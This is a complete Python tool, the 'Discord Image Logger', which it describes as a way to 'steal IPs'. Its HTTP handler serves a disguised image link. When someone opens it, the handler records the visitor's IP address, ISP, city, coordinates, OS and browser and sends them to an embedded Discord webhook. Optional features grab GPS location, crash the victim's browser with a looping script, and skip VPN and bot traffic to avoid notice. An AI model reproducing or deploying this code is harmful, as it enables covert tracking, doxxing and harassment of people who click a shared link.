# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1501860444212564028/BWixMOu1oT1z51MS_c5Yo9um5tkVoCPL4ilfJWtLyXNHo82jjXDQw-lY8U-P6zJ1WDbp",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
